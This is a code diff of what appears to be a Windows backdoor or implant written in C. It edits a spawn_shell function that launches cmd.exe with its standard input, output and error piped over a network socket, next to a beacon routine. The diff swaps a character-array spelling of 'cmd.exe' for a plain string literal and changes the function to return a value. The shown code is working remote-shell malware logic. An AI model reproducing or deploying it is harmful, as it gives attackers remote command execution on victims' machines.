@@ -50,11 +50,10 @@ static void beacon()
 }
 
 /* spawn a shell with the cmd process and pipe stdin, out, and err to the socket */
-static void spawn_shell(SOCKET sock_pipe)
+static int spawn_shell(SOCKET sock_pipe)
 {
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
-  char process[8]= {'c','m','d','.','e','x','e','\0'};
 
   ZeroMemory(&si, sizeof(si));
   si.cb = sizeof(si);
@@ -66,11 +65,13 @@ static void spawn_shell(SOCKET sock_pipe)
 
   ZeroMemory(&pi, sizeof(pi));
 
-  /* create the shell */
-  CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+  CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
   
   /* wait for the process to end, then close the handles */
   WaitForSingleObject(pi.hProcess, INFINITE);
   CloseHandle(pi.hProcess);
   CloseHandle(pi.hThread);
+
+  return 1;
 }
+
